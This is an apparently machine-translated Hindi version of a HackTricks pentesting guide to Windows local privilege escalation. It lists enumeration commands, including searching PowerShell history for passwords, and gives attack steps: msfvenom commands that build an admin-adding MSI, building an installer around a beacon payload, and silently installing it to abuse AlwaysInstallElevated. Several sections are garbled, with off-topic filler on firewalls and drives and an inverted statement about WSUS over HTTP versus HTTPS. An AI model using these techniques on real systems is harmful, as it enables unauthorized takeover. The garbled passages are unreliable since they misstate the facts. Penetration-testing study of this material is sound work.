# Windows स्थानीय प्रिविलेज उन्नयन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके** अपना योगदान दें।

</details>

### **Windows स्थानीय प्रिविलेज उन्नयन वेक्टर्स खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्राथमिक Windows सिद्धांत

### पहुंच टोकन

**यदि आपको पता नहीं है कि Windows पहुंच टोकन क्या होते हैं, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ को पढ़ें:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**यदि आपको पता नहीं है कि इस खंड के शीर्षक में उपयोग किए जाने वाले किसी भी एक्रोनिम का क्या मतलब है, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ को पढ़ें:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### अखंडता स्तर

**यदि आपको पता नहीं है कि Windows में अखंडता स्तर क्या होते हैं, तो आगे बढ़ने से पहले निम्नलिखित पृष्ठ को पढ़ें:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows सुरक्षा नियंत्रण

Windows में विभिन्न चीजें हो सकती हैं जो आपको **सिस्टम की जांच करने से रोक सकती हैं**, कार्यान्वयन को रोक सकती हैं या आपकी गतिविधियों का पता लगा सकती हैं। आपको इन सभी **सुरक्षा उपायों** की **जांच** करनी चाहिए **पृष्ठ** को **पढ़ें** और **उन सभी** **सुरक्षा** **मेकेनिज़्म** को **जांचें** जो प्रिविलेज उन्नयन जांचने से पहले:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## सिस्टम जानकारी

### संस्करण जानकारी जांचना

जांचें कि Windows संस्करण में कोई ज्ञात सुरक्षा गड़बड़ी है या नहीं (पैच भी जांचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### संस्करण शोध

यह [साइट](https://msrc.microsoft.com/update-guide/vulnerability) माइक्रोसॉफ्ट सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियां हैं, जो एक Windows पर्यावरण के द्वारा प्रस्तुत किए गए **विस्फोटक हमले के सतह** को दिखाती हैं।

**सिस्टम पर**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson सम्मिलित है)_

**स्थानीय तथा सिस्टम जानकारी के साथ**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**विस्फोटों के Github repos:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### पर्यावरण

क्या क्रेडेंशियल/महत्वपूर्ण जानकारी env variables में सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### पावरशेल इतिहास

PowerShell एक शक्तिशाली कमांड लाइन इंटरफ़ेस (CLI) है जो माइक्रोसॉफ्ट विंडोज़ सिस्टम पर उपयोग होता है। यह उपयोगकर्ताओं को सिस्टम के साथ इंटरैक्ट करने और विभिन्न कार्यों को संचालित करने की अनुमति देता है। PowerShell इतिहास उपयोगकर्ता द्वारा चलाए गए सभी कमांडों को संग्रहीत करता है।

इतिहास फ़ाइल का डिफ़ॉल्ट स्थान `C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline` है। इस फ़ाइल में प्रत्येक कमांड के लिए एक पंक्ति होती है, जिसमें कमांड का समय, उपयोगकर्ता और कमांड संग्रहीत होता है।

इतिहास फ़ाइल को पढ़ने के लिए, आप `Get-History` कमांड का उपयोग कर सकते हैं। इसके अलावा, आप `Get-Content` कमांड का उपयोग करके इतिहास फ़ाइल की सामग्री को पढ़ सकते हैं।

इतिहास फ़ाइल में संग्रहीत कमांडों को अपवाद या अनुमति नहीं होती है, इसलिए इसे सुरक्षित रखना महत्वपूर्ण है। एक हमलावर इतिहास फ़ाइल के माध्यम से उपयोगकर्ता के द्वारा चलाए गए कमांडों को प्राप्त कर सकता है और इसका उपयोग अनधिकृत गतिविधियों के लिए कर सकता है। इसलिए, यह अच्छा विचार है कि आप अपने इतिहास फ़ाइल को सुरक्षित रखें और अनधिकृत उपयोग से बचें।
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### पावरशेल ट्रांसक्रिप्ट फ़ाइलें

आप यह सीख सकते हैं कि इसे कैसे चालू करें [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### पावरशेल मॉड्यूल लॉगिंग

यह पावरशेल के पाइपलाइन निष्पादन विवरणों को रिकॉर्ड करता है। इसमें निष्पादित किए गए कमांड, कमांड आह्वान और स्क्रिप्ट का कुछ हिस्सा शामिल होता है। यह निष्पादन और आउटपुट परिणामों का पूरा विवरण नहीं हो सकता है।\
आप इसे सक्षम कर सकते हैं पिछले खंड (ट्रांसक्रिप्ट फ़ाइलें) के लिंक का पालन करके, लेकिन "पावरशेल ट्रांस्क्रिप्शन" की बजाय "मॉड्यूल लॉगिंग" को सक्षम करके।
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
पावरशेल लॉग्स से पिछले 15 घटनाओं को देखने के लिए आप निम्नलिखित को निष्पादित कर सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **स्क्रिप्ट ब्लॉक लॉगिंग**

यह कोड ब्लॉक को निष्पादित करने के समय रिकॉर्ड करता है, इसलिए यह स्क्रिप्ट की पूरी गतिविधि और पूरी सामग्री को कैप्चर करता है। यह प्रत्येक गतिविधि का पूरा ऑडिट ट्रेल बनाए रखता है जिसे बाद में फोरेंसिक्स और दुष्ट व्यवहार का अध्ययन करने के लिए उपयोग किया जा सकता है। यह निष्पादन के समय सभी गतिविधि को रिकॉर्ड करता है इसलिए पूरी जानकारी प्रदान करता है।
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
स्क्रिप्ट ब्लॉक लॉगिंग घटनाएं विंडोज इवेंट व्यूअर में निम्नलिखित पथ के तहत मिल सकती हैं: _एप्लिकेशन और सेवा लॉग > माइक्रोसॉफ्ट > विंडोज > पावरशेल > ऑपरेशनल_\
पिछले 20 घटनाओं को देखने के लिए आप निम्नलिखित का उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स

#### Internet Explorer Enhanced Security Configuration (IE ESC)

Internet Explorer Enhanced Security Configuration (IE ESC) एक विशेषता है जो Windows Server इंस्टालेशन पर डिफ़ॉल्ट रूप से सक्षम होती है। यह सुरक्षा सुविधाओं को बढ़ाता है और इंटरनेट एक्सप्लोरर के उपयोग को सीमित करता है। इसे अक्षम करने के लिए निम्न चरणों का पालन करें:

1. सर्वर प्रबंधक खोलें और "Local Server" चुनें।
2. "IE Enhanced Security Configuration" को बंद करें।

#### Proxy Settings

प्रॉक्सी सेटिंग्स का उपयोग करके आप अपने इंटरनेट कनेक्शन को कंप्यूटर नेटवर्क के माध्यम से रूट कर सकते हैं। इसके लिए निम्न चरणों का पालन करें:

1. "Internet Options" खोलें और "Connections" टैब पर जाएं।
2. "LAN settings" बटन पर क्लिक करें।
3. "Use a proxy server for your LAN" ऑप्शन को चुनें और प्रॉक्सी सर्वर का पता और पोर्ट दर्ज करें।
4. "OK" पर क्लिक करें और सभी खिड़कियों को बंद करें।

#### Windows Firewall

Windows फ़ायरवॉल एक सुरक्षा सुविधा है जो आपके सिस्टम को अनधिकृत नेटवर्क एक्सेस से सुरक्षित रखती है। इसे निम्न चरणों का पालन करके सक्षम करें:

1. "Windows Security" खोलें और "Firewall & network protection" चुनें।
2. "Domain network", "Private network", और "Public network" के लिए "Firewall" को चालू करें।

#### User Account Control (UAC)

User Account Control (UAC) एक सुरक्षा सुविधा है जो अनधिकृत सामग्री के खुलासे से आपके सिस्टम को सुरक्षित रखती है। इसे निम्न चरणों का पालन करके सक्षम करें:

1. "Control Panel" खोलें और "User Accounts" चुनें।
2. "Change User Account Control settings" चुनें।
3. स्लाइडर को "Always notify" पर सेट करें।
4. "OK" पर क्लिक करें।

#### Windows Updates

Windows अपडेट्स आपके सिस्टम को नवीनतम सुरक्षा सुविधाओं के साथ अद्यतित रखते हैं। इसे निम्न चरणों का पालन करके सक्षम करें:

1. "Settings" खोलें और "Update & Security" चुनें।
2. "Windows Update" टैब पर जाएं और "Check for updates" बटन पर क्लिक करें।
3. उपलब्ध अपडेट्स को डाउनलोड और स्थापित करें।

#### Account Passwords

सुरक्षित पासवर्ड आपके खातों की सुरक्षा में महत्वपूर्ण भूमिका निभाता है। निम्न चरणों का पालन करके मजबूत पासवर्ड निर्धारित करें:

1. "Control Panel" खोलें और "User Accounts" चुनें।
2. "Manage your credentials" चुनें।
3. "Change your password" चुनें और नया पासवर्ड दर्ज करें।
4. "OK" पर क्लिक करें।
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स

In Windows, a drive refers to a storage device that is assigned a letter, such as C:, D:, etc. Drives can be physical devices, such as hard drives or solid-state drives, or they can be virtual drives, such as network drives or disk image files.

#### Drive Types

There are several types of drives in Windows:

- **Local Drives**: These are physical drives that are directly connected to the computer, such as the internal hard drive or external USB drives.

- **Network Drives**: These are drives that are shared over a network and can be accessed by multiple computers. They are assigned a drive letter and appear as if they are local drives.

- **Virtual Drives**: These are drives that are created using software and appear as if they are physical drives. Examples include disk image files (ISO files) or virtual hard drives (VHD files).

#### Drive Letters

Each drive in Windows is assigned a unique drive letter, which is used to identify and access the drive. The most commonly used drive letters are C:, D:, and E:, but other letters can also be used.

Drive letters are assigned based on the order in which the drives are detected by the operating system. The C: drive is typically reserved for the system drive, which contains the operating system files.

#### Accessing Drives

To access a drive in Windows, you can use File Explorer or the command prompt. In File Explorer, drives are listed under the "This PC" or "Computer" section. You can double-click on a drive to open it and view its contents.

In the command prompt, you can use the drive letter followed by a colon (e.g., C:) to switch to a specific drive. For example, typing `C:` and pressing Enter will switch to the C: drive.

#### Drive Permissions

Each drive in Windows has its own set of permissions that determine who can access and modify its contents. By default, the system drive (usually C:) is only accessible to administrators, while other drives may have different permissions.

To view and modify drive permissions, you can right-click on a drive in File Explorer, select "Properties," and navigate to the "Security" tab. From there, you can add or remove users and groups and assign different levels of access.

#### Conclusion

Understanding drives in Windows is essential for managing and accessing storage devices. By knowing the different types of drives, their assigned letters, and how to access and modify their permissions, you can effectively work with drives in a Windows environment.
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

आप सिस्टम को संक्रमित कर सकते हैं अगर अपडेट http का उपयोग करके नहीं, बल्कि http**S** का उपयोग करके अनुरोध किया जाता है।

आप निम्नलिखित को चलाकर जांच सकते हैं कि क्या नेटवर्क एक non-SSL WSUS अपडेट का उपयोग करता है:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
यदि आपको एक जवाब मिलता है जैसे:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` का मान `1` के बराबर है।

तो, **इसे उत्पन्न किया जा सकता है।** यदि अंतिम रजिस्ट्री 0 के बराबर है, तो WSUS प्रविष्टि को अनदेखा कर दिया जाएगा।

इन सुरक्षा कमजोरियों का उपयोग करने के लिए आप इस तरह के उपकरणों का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- ये MiTM हथियारी उत्पन्न अपडेट स्क्रिप्ट हैं जो गैर-SSL WSUS ट्रैफिक में 'fake' अपडेट्स को इंजेक्ट करती हैं।

यहां अनुसंधान पढ़ें:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**पूरी रिपोर्ट यहां पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)।\
मूल रूप से, यह दोष है जिसे यह बग उत्पन्न करता है:

> यदि हमारे पास स्थानीय उपयोगकर्ता प्रॉक्सी को संशोधित करने की शक्ति है, और विंडोज अपडेट प्रॉक्सी को इंटरनेट एक्सप्लोरर की सेटिंग्स में कॉन्फ़िगर करता है, तो हमारे पास अपने ट्रैफिक को अवरुद्ध करने और अपने एसेट पर उच्चतर उपयोगकर्ता के रूप में कोड चलाने की शक्ति होगी।
>
> इसके अलावा, क्योंकि WSUS सेवा में वर्तमान उपयोगकर्ता की सेटिंग्स का उपयोग करती है, यह अपने प्रमाणपत्र संग्रह का भी उपयोग करेगा। यदि हम WSUS होस्टनाम के लिए एक स्व-साइन किया हुआ प्रमाणपत्र उत्पन्न करते हैं और इस प्रमाणपत्र को वर्तमान उपयोगकर्ता के प्रमाणपत्र संग्रह में जोड़ते हैं, तो हम HTTP और HTTPS WSUS ट्रैफिक दोनों को अवरुद्ध कर सकेंगे। WSUS ने प्रमाणपत्र पर विश्वास-पहले-उपयोग जैसे तर्क को लागू करने के लिए कोई HSTS जैसी युक्तियाँ नहीं बनाई हैं। यदि प्रस्तुत किया गया प्रमाणपत्र उपयोगकर्ता द्वारा विश्वसनीय माना जाता है और सही होस्टनाम है, तो सेवा द्वारा इसे स्वीकार किया जाएगा।

आप इस सुरक्षा कमजोरी का उपयोग उपकरण [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग करके कर सकते हैं (जब यह मुक्त हो जाएगा)।

## KrbRelayUp

यह मूल रूप से विंडोज **डोमेन** परिवेश में एक सामान्य निर्माण नहीं है जहां **LDAP साइनिंग लागू नहीं है**, जहां **उपयोगकर्ता के पास स्वयं के अधिकार हैं** (RBCD को कॉन्फ़िगर करने के लिए) और जहां **उपयोगकर्ता डोमेन में कंप्यूटर बना सकते हैं**।\
सभी **आवश्यकताएं** **डिफ़ॉल्ट सेटिंग्स** के साथ पूरी होती हैं।

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) में उत्पन्न करें उत्पादन।

हालांकि हम अटैक कर रहे हैं यदि अधिक जानकारी के लिए अटैक की फ़्लो की जांच करें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 रजिस्टर **सक्षम** हैं (मान **0x1** है), तो किसी भी विशेषाधिकार के उपयोगकर्ता NT AUTHORITY\\**SYSTEM** के रूप में `*.msi` फ़ाइलें स्थापित (चलाई) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit पेलोड्स

Metasploit पेलोड्स एक महत्वपूर्ण हैकिंग टूल है जो विभिन्न हमलों को अवधारित करने के लिए उपयोग किया जाता है। ये पेलोड्स एक विशेष तरीके से तैयार किए जाते हैं जो एक निश्चित उद्देश्य को प्राप्त करने के लिए उपयोग किए जा सकते हैं, जैसे कि एक सिस्टम में लोकल प्रिविलेज उन्नयन करना।

Metasploit पेलोड्स कई प्रकार के होते हैं, जिनमें से कुछ निम्नलिखित हैं:

- **शेल पेलोड्स**: ये पेलोड्स एक शेल कनेक्शन स्थापित करने के लिए उपयोग किए जाते हैं, जिससे हमले करने वाले को लक्षित सिस्टम पर रिमोट नियंत्रण प्राप्त होता है।
- **मेटरप्रेटर पेलोड्स**: ये पेलोड्स एक विस्तारित नियंत्रण पैनल प्रदान करते हैं जिससे हमले करने वाले को लक्षित सिस्टम पर विस्तारित नियंत्रण प्राप्त होता है।
- **वेबशेल पेलोड्स**: ये पेलोड्स वेब एप्लिकेशनों को हमला करने के लिए उपयोग किए जाते हैं, जिससे हमले करने वाले को लक्षित सिस्टम पर रिमोट नियंत्रण प्राप्त होता है।

ये पेलोड्स Metasploit टूल के साथ शामिल होते हैं और उपयोगकर्ता को विभिन्न हमलों को अवधारित करने की सुविधा प्रदान करते हैं। इन पेलोड्स का उपयोग करके, हमले करने वाले को लक्षित सिस्टम पर नियंत्रण प्राप्त करने के लिए विभिन्न तकनीकों का उपयोग किया जा सकता है।
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक मीटरप्रेटर सत्र है, तो आप इस तकनीक को एक मॉड्यूल का उपयोग करके स्वचालित कर सकते हैं **`exploit/windows/local/always_install_elevated`**

### PowerUP

Power-up से `Write-UserAddMSI` कमांड का उपयोग करें और वर्तमान निर्देशिका में एक Windows MSI बाइनरी बनाएं ताकि विशेषाधिकारों को उन्नत कर सकें। यह स्क्रिप्ट एक पूर्व-संकलित MSI स्थापक लिखता है जो एक उपयोगकर्ता / समूह जोड़ने के लिए प्रश्न पूछता है (इसलिए आपको GIU उपयोग करने की आवश्यकता होगी):
```
Write-UserAddMSI
```
केवल उच्चाधिकार को बढ़ाने के लिए निर्मित बाइनरी को निष्पादित करें।

### MSI व्रापर

इस उपकरण का उपयोग करके एक MSI व्रापर कैसे बनाएं, इस ट्यूटोरियल को पढ़ें। ध्यान दें कि आप एक "**.bat**" फ़ाइल को रैप कर सकते हैं यदि आपको केवल **कमांड लाइन्स** को **निष्पादित** करना है

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX के साथ MSI बनाएं

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studio के साथ MSI बनाएं

* **Cobalt Strike** या **Metasploit** का उपयोग करके `C:\privesc\beacon.exe` में एक **नया Windows EXE TCP पेलोड** उत्पन्न करें
* **Visual Studio** खोलें, **नई परियोजना बनाएं** चुनें और खोज बॉक्स में "installer" टाइप करें। **Setup Wizard** परियोजना का चयन करें और **अगला** पर क्लिक करें।
* परियोजना को एक नाम दें, जैसे **AlwaysPrivesc**, स्थान के लिए **`C:\privesc`** का उपयोग करें, **समाधान और परियोजना को एक ही निर्देशिका में रखें** का चयन करें और **बनाएं** पर क्लिक करें।
* **अगले** पर क्लिक करते रहें जब तक आप चरण 3 में नहीं पहुंचते हैं (शामिल करने के लिए फ़ाइलें चुनें)। **जोड़ें** पर क्लिक करें और आपके द्वारा उत्पन्न किए गए Beacon पेलोड का चयन करें। फिर **समाप्त** पर क्लिक करें।
* **Solution Explorer** में **AlwaysPrivesc** परियोजना को हाइलाइट करें और **Properties** में जाएं, **TargetPlatform** को **x86** से **x64** में बदलें।
* आप अन्य गुण भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो स्थापित ऐप को अधिक विधि से दिखा सकते हैं।
* परियोजना पर दायां क्लिक करें और **View > Custom Actions** का चयन करें।
* **Install** पर दायां क्लिक करें और **Add Custom Action** का चयन करें।
* **Application Folder** पर दोहरी-क्लिक करें, अपनी **beacon.exe** फ़ाइल का चयन करें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि बीकन पेलोड को इंस्टॉलर चलाया जाता है जैसे ही इंस्टॉलर चलाया जाता है।
* **Custom Action Properties** के तहत, **Run64Bit** को **True** में बदलें।
* अंत में, इसे **बिल्ड करें**।
* यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई देती है, तो सुनिश्चित करें कि आपने प्लेटफ़ॉर्म को x64 पर सेट किया है।

### MSI स्थापना

खतरनाक `.msi` फ़ाइल की **स्थापना** को **पृष्ठभूमि में** निष्पादित करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस संकट का उपयोग करने के लिए आप इस्तेमाल कर सकते हैं: _exploit/windows/local/always\_install\_elevated_

## एंटीवायरस और डिटेक्टर

### ऑडिट सेटिंग्स

ये सेटिंग्स निर्धारित करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानने के लिए रोचक है कि लॉग कहां भेजे जाते हैं।
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** आपको डोमेन-जुड़े कंप्यूटरों पर स्थानीय व्यवस्थापक पासवर्ड (जो यादृच्छिक, अद्वितीय और नियमित रूप से बदलता है) का प्रबंधन करने की अनुमति देता है। ये पासवर्ड सेंट्रली संग्रहीत किए जाते हैं एक्टिव डायरेक्टरी में और अधिकृत उपयोगकर्ताओं को ACL का उपयोग करके प्रतिबंधित किया जाता है। यदि आपको पर्याप्त अनुमति दी जाती है तो आप स्थानीय व्यवस्थापकों के पासवर्ड पढ़ सकते हैं।

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

यदि सक्रिय है, तो **प्लेन-टेक्स्ट पासवर्ड LSASS में संग्रहीत होते हैं** (स्थानीय सुरक्षा प्राधिकरण उपनियंत्रण सेवा)।\
[**इस पृष्ठ में WDigest के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#wdigest)।
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA सुरक्षा

माइक्रोसॉफ्ट ने **Windows 8.1 और बाद में** LSA की अतिरिक्त सुरक्षा प्रदान की है ताकि अविश्वसनीय प्रक्रियाएं इसकी मेमोरी को **पढ़ने** या कोड इंजेक्शन करने के लिए सक्षम न बना सकें।\
[**LSA सुरक्षा के बारे में अधिक जानकारी यहां**](../stealing-credentials/credentials-protections.md#lsa-protection).
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### क्रेडेंशियल गार्ड

**क्रेडेंशियल गार्ड** विंडोज 10 (एंटरप्राइज और एजुकेशन संस्करण) में एक नई सुविधा है जो आपके क्रेडेंशियल्स को पास द हैश जैसे खतरों से सुरक्षित रखने में मदद करती है।\
[**क्रेडेंशियल गार्ड के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### कैश किए गए क्रेडेंशियल्स

**डोमेन क्रेडेंशियल्स** ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किए जाते हैं और **स्थानीय सुरक्षा प्राधिकरण** (LSA) द्वारा **प्रमाणित** किए जाते हैं। आमतौर पर, डोमेन क्रेडेंशियल्स किसी उपयोगकर्ता के लिए स्थापित किए जाते हैं जब एक पंजीकृत सुरक्षा पैकेज उपयोगकर्ता के लॉगऑन डेटा को प्रमाणित करता है।\
[**कैश किए गए क्रेडेंशियल्स के बारे में अधिक जानकारी यहां**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूहों की जांच करें

आपको यह जांचना चाहिए कि आपके समूहों में से कोई भी ऐसे अनुमतियाँ हैं जो दिलचस्प हो सकती हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### प्रबंधित समूह

यदि आप किसी प्रबंधित समूह में शामिल हैं तो आपको उच्चाधिकारों को बढ़ाने की क्षमता हो सकती है। यहां प्रबंधित समूहों के बारे में और उन्हें उच्चाधिकारों को बढ़ाने के लिए कैसे दुरुपयोग करें के बारे में जानें:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### टोकन मानिपुलेशन

इस पृष्ठ पर टोकन क्या है इसके बारे में और अधिक जानें: [Windows Tokens](../authentication-credentials-uac-and-efs.md#access-tokens).\
दिए गए पृष्ठ पर दिए गए रोचक टोकनों के बारे में और उन्हें दुरुपयोग करने के बारे में जानें:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### लॉग इन किए गए उपयोगकर्ता / सत्र
```
qwinsta
klist sessions
```
### होम फ़ोल्डर्स

